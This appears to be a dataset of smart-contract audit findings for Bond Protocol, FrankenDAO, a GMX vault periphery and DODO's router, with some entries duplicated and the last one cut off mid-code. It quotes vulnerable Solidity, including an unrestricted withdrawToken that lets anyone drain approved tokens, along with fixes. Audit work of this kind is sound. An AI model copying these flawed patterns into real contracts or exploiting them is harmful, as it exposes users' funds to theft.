BondBaseSDA.setDefaults doesn't validate inputsчmediumч```\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\nчBondBaseSDA.setDefaults doesn't validate inputs which can lead to initializing new markets incorrectly\n```\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\n\nFunction BondBaseSDA.setDefaults doesn't do any checkings, as you can see. Because of that it's possible to provide values that will break market functionality.\nFor example you can set `minDepositInterval` to be bigger than `minMarketDuration` and it will be not possible to create new market.\nOr you can provide `minDebtBuffer` to be 100% ot 0% that will break logic of market closing.ч
BondAggregator.liveMarketsBy eventually will revert because of block gas limitчmediumч```\n    function liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n        uint256 count;\n        IBondAuctioneer auctioneer;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ++count;\n            }\n        }\n\n\n        uint256[] memory ids = new uint256[](count);\n        count = 0;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ids[count] = i;\n                ++count;\n            }\n        }\n\n\n        return ids;\n    }\n```\nчBondAggregator.liveMarketsBy eventually will revert because of block gas limit\n```\n    function liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n        uint256 count;\n        IBondAuctioneer auctioneer;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ++count;\n            }\n        }\n\n\n        uint256[] memory ids = new uint256[](count);\n        count = 0;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ids[count] = i;\n                ++count;\n            }\n        }\n\n\n        return ids;\n    }\n```\n\nBondAggregator.liveMarketsBy function is looping through all markets and does at least `marketCounter` amount of external calls(when all markets are not live) and at most 4 * `marketCounter` external calls(when all markets are live and owner matches. This all consumes a lot of gas, even that is called from view function. And each new market increases loop size.\nThat means that after some time `marketsToAuctioneers` mapping will be big enough that the gas amount sent for view/pure function will be not enough to retrieve all data(50 million gas according to this). So the function will revert.\nAlso similar problem is with `findMarketFor`, `marketsFor` and `liveMarketsFor` functions.чRemove not active markets or some start and end indices to functions.\nDiscussion\nEvert0x\nMessage from sponsor\n\nAgree. We added start and stop indices to the BondAggregator.liveMarketsBy function to allow pagination through the bond markets and avoid the block gas limit.\nxiaoming9090\nFixed in https://github.com/Bond-Protocol/bonds/commit/5a2a9a982f3bdfc31d22f72d270bf2d556096281чFunctions will always revert and whoever depends on it will not be able to get information.\nCode Snippet\nProvided above\nTool used\nManual Review
meta.tuneBelowCapacity param is not updated when BondBaseSDA.setIntervals is calledчmediumч```\n    function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n        // Check that the market is live\n        if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n\n        // Check that the intervals are non-zero\n        if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0)\n            revert Auctioneer_InvalidParams();\n\n\n        // Check that tuneInterval >= tuneAdjustmentDelay\n        if (intervals_[0] < intervals_[1]) revert Auctioneer_InvalidParams();\n\n\n        BondMetadata storage meta = metadata[id_];\n        // Check that tuneInterval >= depositInterval\n        if (intervals_[0] < meta.depositInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that debtDecayInterval >= minDebtDecayInterval\n        if (intervals_[2] < minDebtDecayInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that sender is market owner\n        BondMarket memory market = markets[id_];\n        if (msg.sender != market.owner) revert Auctioneer_OnlyMarketOwner();\n\n\n        // Update intervals\n        meta.tuneInterval = intervals_[0];\n        meta.tuneIntervalCapacity = market.capacity.mulDiv(\n            uint256(intervals_[0]),\n            uint256(terms[id_].conclusion) - block.timestamp\n        ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n        meta.tuneAdjustmentDelay = intervals_[1];\n        meta.debtDecayInterval = intervals_[2];\n    }\n```\nчWhen BondBaseSDA.setIntervals function is called then meta.tuneBelowCapacity param is not updated which has impact on price tuning.\n```\n    function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n        // Check that the market is live\n        if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n\n        // Check that the intervals are non-zero\n        if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0)\n            revert Auctioneer_InvalidParams();\n\n\n        // Check that tuneInterval >= tuneAdjustmentDelay\n        if (intervals_[0] < intervals_[1]) revert Auctioneer_InvalidParams();\n\n\n        BondMetadata storage meta = metadata[id_];\n        // Check that tuneInterval >= depositInterval\n        if (intervals_[0] < meta.depositInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that debtDecayInterval >= minDebtDecayInterval\n        if (intervals_[2] < minDebtDecayInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that sender is market owner\n        BondMarket memory market = markets[id_];\n        if (msg.sender != market.owner) revert Auctioneer_OnlyMarketOwner();\n\n\n        // Update intervals\n        meta.tuneInterval = intervals_[0];\n        meta.tuneIntervalCapacity = market.capacity.mulDiv(\n            uint256(intervals_[0]),\n            uint256(terms[id_].conclusion) - block.timestamp\n        ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n        meta.tuneAdjustmentDelay = intervals_[1];\n        meta.debtDecayInterval = intervals_[2];\n    }\n```\n\n`meta.tuneInterval` has impact on `meta.tuneIntervalCapacity`. That means that when you change tuning interval you also change the capacity that is operated during tuning. There is also one more param that depends on this, but is not counted here.\n```\n        if (\n            (market.capacity < meta.tuneBelowCapacity && timeNeutralCapacity < initialCapacity) ||\n            (time_ >= meta.lastTune + meta.tuneInterval && timeNeutralCapacity > initialCapacity)\n        ) {\n            // Calculate the correct payout to complete on time assuming each bond\n            // will be max size in the desired deposit interval for the remaining time\n            //\n            // i.e. market has 10 days remaining. deposit interval is 1 day. capacity\n            // is 10,000 TOKEN. max payout would be 1,000 TOKEN (10,000 * 1 / 10).\n            markets[id_].maxPayout = capacity.mulDiv(uint256(meta.depositInterval), timeRemaining);\n\n\n            // Calculate ideal target debt to satisty capacity in the remaining time\n            // The target debt is based on whether the market is under or oversold at this point in time\n            // This target debt will ensure price is reactive while ensuring the magnitude of being over/undersold\n            // doesn't cause larger fluctuations towards the end of the market.\n            //\n            // Calculate target debt from the timeNeutralCapacity and the ratio of debt decay interval and the length of the market\n            uint256 targetDebt = timeNeutralCapacity.mulDiv(\n                uint256(meta.debtDecayInterval),\n                uint256(meta.length)\n            );\n\n\n            // Derive a new control variable from the target debt\n            uint256 controlVariable = terms[id_].controlVariable;\n            uint256 newControlVariable = price_.mulDivUp(market.scale, targetDebt);\n\n\n            emit Tuned(id_, controlVariable, newControlVariable);\n\n\n            if (newControlVariable < controlVariable) {\n                // If decrease, control variable change will be carried out over the tune interval\n                // this is because price will be lowered\n                uint256 change = controlVariable - newControlVariable;\n                adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true);\n            } else {\n                // Tune up immediately\n                terms[id_].controlVariable = newControlVariable;\n                // Set current adjustment to inactive (e.g. if we are re-tuning early)\n                adjustments[id_].active = false;\n            }\n\n\n            metadata[id_].lastTune = time_;\n            metadata[id_].tuneBelowCapacity = market.capacity > meta.tuneIntervalCapacity\n                ? market.capacity - meta.tuneIntervalCapacity\n                : 0;\n            metadata[id_].lastTuneDebt = targetDebt;\n        }\n```\n\nIf you don't update `meta.tuneBelowCapacity` when changing intervals you have a risk, that price will not be tuned when tuneIntervalCapacity was decreased or it will be still tuned when tuneIntervalCapacity was increased.\nAs a result tuning will not be completed when needed.чUpdate meta.tuneBelowCapacity in BondBaseSDA.setIntervals function.\nDiscussion\nEvert0x\nMessage from sponsor\n\nAgree. We added a line to set meta.tuneBelowCapacity in the setIntervals function to fix this.\nxiaoming9090\nFixed in https://github.com/Bond-Protocol/bonds/commit/bfd9eea0cc035b3ef1cca4072356f83695f960ebчTuning logic will not be completed when needed.\nCode Snippet\nProvided above\nTool used\nManual Review
BondBaseSDA.setDefaults doesn't validate inputsчmediumч```\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\nчBondBaseSDA.setDefaults doesn't validate inputs which can lead to initializing new markets incorrectly\n```\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\n\nFunction BondBaseSDA.setDefaults doesn't do any checkings, as you can see. Because of that it's possible to provide values that will break market functionality.\nFor example you can set `minDepositInterval` to be bigger than `minMarketDuration` and it will be not possible to create new market.\nOr you can provide `minDebtBuffer` to be 100% ot 0% that will break logic of market closing.ч
BondAggregator.liveMarketsBy eventually will revert because of block gas limitчmediumч```\n    function liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n        uint256 count;\n        IBondAuctioneer auctioneer;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ++count;\n            }\n        }\n\n\n        uint256[] memory ids = new uint256[](count);\n        count = 0;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ids[count] = i;\n                ++count;\n            }\n        }\n\n\n        return ids;\n    }\n```\nчBondAggregator.liveMarketsBy eventually will revert because of block gas limit\n```\n    function liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n        uint256 count;\n        IBondAuctioneer auctioneer;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ++count;\n            }\n        }\n\n\n        uint256[] memory ids = new uint256[](count);\n        count = 0;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ids[count] = i;\n                ++count;\n            }\n        }\n\n\n        return ids;\n    }\n```\n\nBondAggregator.liveMarketsBy function is looping through all markets and does at least `marketCounter` amount of external calls(when all markets are not live) and at most 4 * `marketCounter` external calls(when all markets are live and owner matches. This all consumes a lot of gas, even that is called from view function. And each new market increases loop size.\nThat means that after some time `marketsToAuctioneers` mapping will be big enough that the gas amount sent for view/pure function will be not enough to retrieve all data(50 million gas according to this). So the function will revert.\nAlso similar problem is with `findMarketFor`, `marketsFor` and `liveMarketsFor` functions.чRemove not active markets or some start and end indices to functions.\nDiscussion\nEvert0x\nMessage from sponsor\n\nAgree. We added start and stop indices to the BondAggregator.liveMarketsBy function to allow pagination through the bond markets and avoid the block gas limit.\nxiaoming9090\nFixed in https://github.com/Bond-Protocol/bonds/commit/5a2a9a982f3bdfc31d22f72d270bf2d556096281чFunctions will always revert and whoever depends on it will not be able to get information.\nCode Snippet\nProvided above\nTool used\nManual Review
meta.tuneBelowCapacity param is not updated when BondBaseSDA.setIntervals is calledчmediumч```\n    function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n        // Check that the market is live\n        if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n\n        // Check that the intervals are non-zero\n        if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0)\n            revert Auctioneer_InvalidParams();\n\n\n        // Check that tuneInterval >= tuneAdjustmentDelay\n        if (intervals_[0] < intervals_[1]) revert Auctioneer_InvalidParams();\n\n\n        BondMetadata storage meta = metadata[id_];\n        // Check that tuneInterval >= depositInterval\n        if (intervals_[0] < meta.depositInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that debtDecayInterval >= minDebtDecayInterval\n        if (intervals_[2] < minDebtDecayInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that sender is market owner\n        BondMarket memory market = markets[id_];\n        if (msg.sender != market.owner) revert Auctioneer_OnlyMarketOwner();\n\n\n        // Update intervals\n        meta.tuneInterval = intervals_[0];\n        meta.tuneIntervalCapacity = market.capacity.mulDiv(\n            uint256(intervals_[0]),\n            uint256(terms[id_].conclusion) - block.timestamp\n        ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n        meta.tuneAdjustmentDelay = intervals_[1];\n        meta.debtDecayInterval = intervals_[2];\n    }\n```\nчWhen BondBaseSDA.setIntervals function is called then meta.tuneBelowCapacity param is not updated which has impact on price tuning.\n```\n    function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n        // Check that the market is live\n        if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n\n        // Check that the intervals are non-zero\n        if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0)\n            revert Auctioneer_InvalidParams();\n\n\n        // Check that tuneInterval >= tuneAdjustmentDelay\n        if (intervals_[0] < intervals_[1]) revert Auctioneer_InvalidParams();\n\n\n        BondMetadata storage meta = metadata[id_];\n        // Check that tuneInterval >= depositInterval\n        if (intervals_[0] < meta.depositInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that debtDecayInterval >= minDebtDecayInterval\n        if (intervals_[2] < minDebtDecayInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that sender is market owner\n        BondMarket memory market = markets[id_];\n        if (msg.sender != market.owner) revert Auctioneer_OnlyMarketOwner();\n\n\n        // Update intervals\n        meta.tuneInterval = intervals_[0];\n        meta.tuneIntervalCapacity = market.capacity.mulDiv(\n            uint256(intervals_[0]),\n            uint256(terms[id_].conclusion) - block.timestamp\n        ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n        meta.tuneAdjustmentDelay = intervals_[1];\n        meta.debtDecayInterval = intervals_[2];\n    }\n```\n\n`meta.tuneInterval` has impact on `meta.tuneIntervalCapacity`. That means that when you change tuning interval you also change the capacity that is operated during tuning. There is also one more param that depends on this, but is not counted here.\n```\n        if (\n            (market.capacity < meta.tuneBelowCapacity && timeNeutralCapacity < initialCapacity) ||\n            (time_ >= meta.lastTune + meta.tuneInterval && timeNeutralCapacity > initialCapacity)\n        ) {\n            // Calculate the correct payout to complete on time assuming each bond\n            // will be max size in the desired deposit interval for the remaining time\n            //\n            // i.e. market has 10 days remaining. deposit interval is 1 day. capacity\n            // is 10,000 TOKEN. max payout would be 1,000 TOKEN (10,000 * 1 / 10).\n            markets[id_].maxPayout = capacity.mulDiv(uint256(meta.depositInterval), timeRemaining);\n\n\n            // Calculate ideal target debt to satisty capacity in the remaining time\n            // The target debt is based on whether the market is under or oversold at this point in time\n            // This target debt will ensure price is reactive while ensuring the magnitude of being over/undersold\n            // doesn't cause larger fluctuations towards the end of the market.\n            //\n            // Calculate target debt from the timeNeutralCapacity and the ratio of debt decay interval and the length of the market\n            uint256 targetDebt = timeNeutralCapacity.mulDiv(\n                uint256(meta.debtDecayInterval),\n                uint256(meta.length)\n            );\n\n\n            // Derive a new control variable from the target debt\n            uint256 controlVariable = terms[id_].controlVariable;\n            uint256 newControlVariable = price_.mulDivUp(market.scale, targetDebt);\n\n\n            emit Tuned(id_, controlVariable, newControlVariable);\n\n\n            if (newControlVariable < controlVariable) {\n                // If decrease, control variable change will be carried out over the tune interval\n                // this is because price will be lowered\n                uint256 change = controlVariable - newControlVariable;\n                adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true);\n            } else {\n                // Tune up immediately\n                terms[id_].controlVariable = newControlVariable;\n                // Set current adjustment to inactive (e.g. if we are re-tuning early)\n                adjustments[id_].active = false;\n            }\n\n\n            metadata[id_].lastTune = time_;\n            metadata[id_].tuneBelowCapacity = market.capacity > meta.tuneIntervalCapacity\n                ? market.capacity - meta.tuneIntervalCapacity\n                : 0;\n            metadata[id_].lastTuneDebt = targetDebt;\n        }\n```\n\nIf you don't update `meta.tuneBelowCapacity` when changing intervals you have a risk, that price will not be tuned when tuneIntervalCapacity was decreased or it will be still tuned when tuneIntervalCapacity was increased.\nAs a result tuning will not be completed when needed.чUpdate meta.tuneBelowCapacity in BondBaseSDA.setIntervals function.\nDiscussion\nEvert0x\nMessage from sponsor\n\nAgree. We added a line to set meta.tuneBelowCapacity in the setIntervals function to fix this.\nxiaoming9090\nFixed in https://github.com/Bond-Protocol/bonds/commit/bfd9eea0cc035b3ef1cca4072356f83695f960ebчTuning logic will not be completed when needed.\nCode Snippet\nProvided above\nTool used\nManual Review
`Staking.unstake()` doesn't decrease the original voting power that was used in `Staking.stake()`.чhighч```\n    function getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n      if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n      // If tokenId < 10000, it's a FrankenPunk, so 100/100 = a multiplier of 1\n      uint multiplier = _tokenId < 10_000 ? PERCENT : monsterMultiplier;\n      \n      // evilBonus will return 0 for all FrankenMonsters, as they are not eligible for the evil bonus\n      return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n    }\n```\nч`Staking.unstake()` doesn't decrease the original voting power that was used in `Staking.stake()`.\nWhen users stake/unstake the underlying NFTs, it calculates the token voting power using getTokenVotingPower() and increases/decreases their voting power accordingly.\n```\n    function getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n      if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n      // If tokenId < 10000, it's a FrankenPunk, so 100/100 = a multiplier of 1\n      uint multiplier = _tokenId < 10_000 ? PERCENT : monsterMultiplier;\n      \n      // evilBonus will return 0 for all FrankenMonsters, as they are not eligible for the evil bonus\n      return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n    }\n```\n\nBut `getTokenVotingPower()` uses some parameters like `monsterMultiplier` and `baseVotes` and the output would be changed for the same `tokenId` after the admin changed these settings.\nCurrently, `_stake()` and `_unstake()` calculates the token voting power independently and the below scenario would be possible.\nAt the first time, `baseVotes = 20, monsterMultiplier = 50`.\nA user staked a `FrankenMonsters` and his voting power = 10 here.\nAfter that, the admin changed `monsterMultiplier = 60`.\nWhen a user tries to unstake the NFT, the token voting power will be `20 * 60 / 100 = 12` here.\nSo it will revert with uint underflow here.\nAfter all, he can't unstake the NFT.чI think we should add a mapping like `tokenVotingPower` to save an original token voting power when users stake the token and decrease the same amount when they unstake.\nDiscussion\nzobront\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/17ч`votesFromOwnedTokens` might be updated wrongly or users can't unstake for the worst case because it doesn't decrease the same token voting power while unstaking.\nCode Snippet\nTool used\nManual Review
If a user approves junior vault tokens to WithdrawPeriphery, anyone can withdraw/redeem his/her tokenчhighч```\n    function withdrawToken(\n        address from,\n        address token,\n        address receiver,\n        uint256 sGlpAmount\n    ) external returns (uint256 amountOut) {\n        // user has approved periphery to use junior vault shares\n        dnGmxJuniorVault.withdraw(sGlpAmount, address(this), from);\n// rest of code\n\n    function redeemToken(\n        address from,\n        address token,\n        address receiver,\n        uint256 sharesAmount\n    ) external returns (uint256 amountOut) {\n        // user has approved periphery to use junior vault shares\n        dnGmxJuniorVault.redeem(sharesAmount, address(this), from);\n// rest of code\n```\nчIf users want to withdraw/redeem tokens by WithdrawPeriphery, they should approve token approval to WithdrawPeriphery, then call `withdrawToken()` or `redeemToken()`. But if users approve `dnGmxJuniorVault` to WithdrawPeriphery, anyone can withdraw/redeem his/her token.\nUsers should approve `dnGmxJuniorVault` before calling `withdrawToken()` or redeemToken():\n```\n    function withdrawToken(\n        address from,\n        address token,\n        address receiver,\n        uint256 sGlpAmount\n    ) external returns (uint256 amountOut) {\n        // user has approved periphery to use junior vault shares\n        dnGmxJuniorVault.withdraw(sGlpAmount, address(this), from);\n// rest of code\n\n    function redeemToken(\n        address from,\n        address token,\n        address receiver,\n        uint256 sharesAmount\n    ) external returns (uint256 amountOut) {\n        // user has approved periphery to use junior vault shares\n        dnGmxJuniorVault.redeem(sharesAmount, address(this), from);\n// rest of code\n```\n\nFor better user experience, we always use `approve(WithdrawPeriphery, type(uint256).max)`. It means that if Alice approves the max amount, anyone can withdraw/redeem her tokens anytime. Another scenario is that if Alice approves 30 amounts, she wants to call `withdrawToken` to withdraw 30 tokens. But in this case Alice should send two transactions separately, then an attacker can frontrun `withdrawToken` transaction and withdraw Alice’s token.ч
The total community voting power is updated incorrectly when a user delegates.чhighч```\n    tokenVotingPower[currentDelegate] -= amount;\n    tokenVotingPower[_delegatee] += amount; \n\n    // If a user is delegating back to themselves, they regain their community voting power, so adjust totals up\n    if (_delegator == _delegatee) {\n      _updateTotalCommunityVotingPower(_delegator, true);\n\n    // If a user delegates away their votes, they forfeit their community voting power, so adjust totals down\n    } else if (currentDelegate == _delegator) {\n      _updateTotalCommunityVotingPower(_delegator, false);\n    }\n```\nчWhen a user delegates their voting power from staked tokens, the total community voting power should be updated. But the update logic is not correct, the the total community voting power could be wrong values.\n```\n    tokenVotingPower[currentDelegate] -= amount;\n    tokenVotingPower[_delegatee] += amount; \n\n    // If a user is delegating back to themselves, they regain their community voting power, so adjust totals up\n    if (_delegator == _delegatee) {\n      _updateTotalCommunityVotingPower(_delegator, true);\n\n    // If a user delegates away their votes, they forfeit their community voting power, so adjust totals down\n    } else if (currentDelegate == _delegator) {\n      _updateTotalCommunityVotingPower(_delegator, false);\n    }\n```\n\nWhen the total community voting power is increased in the first if statement, _delegator's token voting power might be positive already and community voting power might be added to total community voting power before.\nAlso, currentDelegate's token voting power might be still positive after delegation so we shouldn't remove the communitiy voting power this time.чAdd more conditions to check if the msg.sender delegated or not.\n```\n    if (_delegator == _delegatee) {\n        if(tokenVotingPower[_delegatee] == amount) {\n            _updateTotalCommunityVotingPower(_delegator, true);\n        }\n        if(tokenVotingPower[currentDelegate] == 0) {\n            _updateTotalCommunityVotingPower(currentDelegate, false);      \n        }\n    } else if (currentDelegate == _delegator) {\n        if(tokenVotingPower[_delegatee] == amount) {\n            _updateTotalCommunityVotingPower(_delegatee, true);\n        }\n        if(tokenVotingPower[_delegator] == 0) {\n            _updateTotalCommunityVotingPower(_delegator, false);      \n        }\n    }\n```\n\nDiscussion\nzobront\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/15\nNote for JTP: Please double check this one, as I'm 99% confident but would love a second set of eyes on it.чThe total community voting power can be incorrect.\nCode Snippet\nTool used\nManual Review
[Tomo-M3] Use safeMint instead of mint for ERC721чmediumч```\n/**\n * @dev Mints `tokenId` and transfers it to `to`.\n *\n * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n *\n * Requirements:\n *\n * - `tokenId` must not exist.\n * - `to` cannot be the zero address.\n *\n * Emits a {Transfer} event.\n */\nfunction _mint(address to, uint256 tokenId) internal virtual {\n```\nчUse safeMint instead of mint for ERC721\nThe `msg.sender` will be minted as a proof of staking NFT when `_stakeToken()` is called.\nHowever, if `msg.sender` is a contract address that does not support ERC721, the NFT can be frozen in the contract.\nAs per the documentation of EIP-721:\nA wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\nRef: https://eips.ethereum.org/EIPS/eip-721\n```\n/**\n * @dev Mints `tokenId` and transfers it to `to`.\n *\n * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n *\n * Requirements:\n *\n * - `tokenId` must not exist.\n * - `to` cannot be the zero address.\n *\n * Emits a {Transfer} event.\n */\nfunction _mint(address to, uint256 tokenId) internal virtual {\n```\nч"Use `safeMint` instead of `mint` to check received address support for ERC721 implementation.\nDiscussion\nzobront\nI might consider this a duplicate of #55 but not sure how this is usually judged. We will be changing this function based on other issues to not allow ""approved"" spenders, so msg.sender will be the owner of the FrankenPunk, which ensures they are able to hold NFTs.\nzobront\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/14\nI didn't need to add safeMint, as I made a change for another issue that removed the ability to non holder to unstake, which means they have the ability to hold NFTs."чUsers possibly lose their NFTs\nCode Snippet\n```\n  _mint(msg.sender, _tokenId);\n```\n\nTool used\nManual Review
[Medium-1] Hardcoded `monsterMultiplier` in case of `stakedTimeBonus` disregards the updates done to `monsterMultiplier` through `setMonsterMultiplier()`чmediumч```\nfunction getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n      if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n      // If tokenId < 10000, it's a FrankenPunk, so 100/100 = a multiplier of 1\n      uint multiplier = _tokenId < 10_000 ? PERCENT : monsterMultiplier;\n      \n      // evilBonus will return 0 for all FrankenMonsters, as they are not eligible for the evil bonus\n      return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n    }\n```\nч[Medium-1] Hardcoded `monsterMultiplier` in case of `stakedTimeBonus` disregards the updates done to `monsterMultiplier` through `setMonsterMultiplier()`\nFrankenDAO allows users to stake two types of NFTs, `Frankenpunks` and `Frankenmonsters` , one of which is considered more valuable, ie: `Frankenpunks`,\nThis is achieved by reducing votes applicable for `Frankenmonsters` by `monsterMultiplier`.\n```\nfunction getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n      if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n      // If tokenId < 10000, it's a FrankenPunk, so 100/100 = a multiplier of 1\n      uint multiplier = _tokenId < 10_000 ? PERCENT : monsterMultiplier;\n      \n      // evilBonus will return 0 for all FrankenMonsters, as they are not eligible for the evil bonus\n      return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n    }\n```\n\nThis `monsterMultiplier` is initially set as 50 and could be changed by governance proposal.\n```\nfunction setMonsterMultiplier(uint _monsterMultiplier) external onlyExecutor {\n    emit MonsterMultiplierChanged(monsterMultiplier = _monsterMultiplier); \n  }\n```\n\nHowever, one piece of code inside the FrakenDAO staking contract doesn't consider this and has a monster multiplier hardcoded.\n```\nfunction stake(uint[] calldata _tokenIds, uint _unlockTime) \n----\nfunction _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {\n   if (_unlockTime > 0) {\n     --------\n      stakedTimeBonus[_tokenId] = _tokenId < 10000 ? **fullStakedTimeBonus : fullStakedTimeBonus / 2;** \n    }\n--------\n```\n\nHence any update done to `monsterMultiplier` would not reflect in the calculation of `stakedTimeBonus`, and thereby votes.чConsider replacing the hardcoded value with monsterMultiplier\nDiscussion\nzobront\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/12чAny update done to monsterMultiplier would not be reflected in stakedTimeBonus; it would always remain as /2 or 50%.\nLikelihood: Medium\nOne needs to pass a governance proposal to change the monster multiplier, so this is definitely not a high likelihood; it's not low as well, as there is a clear provision in spec regarding this.\nCode Snippet\nTool used\nManual Review
`getCommunityVotingPower` doesn't calculate voting Power correctly due to precision lossчmediumч```\n return \n        (votes * cpMultipliers.votes / PERCENT) + \n        (proposalsCreated * cpMultipliers.proposalsCreated / PERCENT) + \n        (proposalsPassed * cpMultipliers.proposalsPassed / PERCENT);\n```\nчIn getCommunityVotingPower function, the `return` statement is where the mistake lies in:\n```\n return \n        (votes * cpMultipliers.votes / PERCENT) + \n        (proposalsCreated * cpMultipliers.proposalsCreated / PERCENT) + \n        (proposalsPassed * cpMultipliers.proposalsPassed / PERCENT);\n```\n\nHere, after each multiplication by the `Multipliers`, we immediately divide it by `PERCENT`. Every time we do a division, there is a certain amount of precision loss. And when its done thrice, the loss just accumulates. So instead, the division by `PERCENT` should be done after all 3 terms are added together.\nNote that this loss is not there, if the `Multipliers` are a multiple of `PERCENT`. But these values can be changed through governance later. So its better to be careful assuming that they may not always be a multiple of `PERCENT`.ч
Issue when handling native ETH trade and WETH trade in DODO RouterProxy#externalSwapчmediumч"```\n    function externalSwap(\n        address fromToken,\n        address toToken,\n        address approveTarget,\n        address swapTarget,\n        uint256 fromTokenAmount,\n        uint256 minReturnAmount,\n        bytes memory feeData,\n        bytes memory callDataConcat,\n        uint256 deadLine\n    ) external payable judgeExpired(deadLine) returns (uint256 receiveAmount) {      \n        require(isWhiteListedContract[swapTarget], ""DODORouteProxy: Not Whitelist Contract"");  \n        require(isApproveWhiteListedContract[approveTarget], ""DODORouteProxy: Not Whitelist Appprove Contract"");  \n\n        // transfer in fromToken\n        if (fromToken != _ETH_ADDRESS_) {\n            // approve if needed\n            if (approveTarget != address(0)) {\n                IERC20(fromToken).universalApproveMax(approveTarget, fromTokenAmount);\n            }\n\n            IDODOApproveProxy(_DODO_APPROVE_PROXY_).claimTokens(\n                fromToken,\n                msg.sender,\n                address(this),\n                fromTokenAmount\n            );\n        }\n\n        // swap\n        uint256 toTokenOriginBalance;\n        if(toToken != _ETH_ADDRESS_) {\n            toTokenOriginBalance 